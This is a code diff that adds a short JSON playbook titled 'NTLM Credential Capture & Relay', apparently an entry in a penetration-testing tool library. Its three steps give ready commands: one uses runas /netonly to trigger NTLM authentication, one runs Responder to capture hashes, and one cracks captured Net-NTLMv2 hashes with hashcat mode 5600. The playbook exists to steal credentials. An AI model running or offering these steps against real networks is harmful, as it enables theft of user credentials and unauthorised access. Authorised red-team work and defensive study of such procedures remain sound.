@@ -1,0 +1,25 @@
+{
+	"name": "NTLM Credential Capture & Relay",
+	"description": "Force and intercept NTLM authentication for relay or cracking.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Trigger Auth",
+			"command": "runas /netonly /user:corp\\user cmd.exe",
+			"description": "Prompt NTLM challenge."
+		},
+		{
+			"index": 2,
+			"name": "Poison & Capture",
+			"command": "responder -I eth0 -A",
+			"description": "Analyze only; capture hashes."
+		},
+		{
+			"index": 3,
+			"name": "Offline Crack",
+			"command": "hashcat -m 5600 captured.txt wordlist.txt",
+			"description": "Recover plaintext from Net-NTLMv2."
+		}
+	]
+}
